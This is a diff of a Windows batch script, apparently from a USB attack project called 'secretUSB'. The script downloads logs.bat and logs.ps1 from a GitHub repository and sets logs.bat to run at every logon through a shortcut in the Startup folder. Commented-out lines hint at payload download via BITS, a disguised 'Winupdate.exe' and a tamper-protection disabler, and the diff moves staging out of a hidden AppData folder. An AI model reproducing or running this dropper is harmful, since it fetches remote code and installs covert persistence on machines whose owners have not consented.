@@ -83,15 +83,14 @@ REM powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.e
 
 REM start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
 
+
+REM mkdir %USERPROFILE%\AppData\Roaming\System_logs
+REM cd %USERPROFILE%\AppData\Roaming\System_logs
+cd C:\Users\SYSWIN\Desktop
+
 curl -O https://github.com/Goenae/secretUSB/raw/main/logs.bat
 curl -O https://github.com/Goenae/secretUSB/raw/main/logs.ps1
 
-mkdir %USERPROFILE%\AppData\Roaming\System_logs
-
-move logs.bat %USERPROFILE%\AppData\Roaming\System_logs
-move logs.ps1 %USERPROFILE%\AppData\Roaming\System_logs
-
-cd %USERPROFILE%\AppData\Roaming\System_logs
 
 powershell.exe -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~logs.lnk');$s.TargetPath='%~logs.bat';$s.Save()"
 
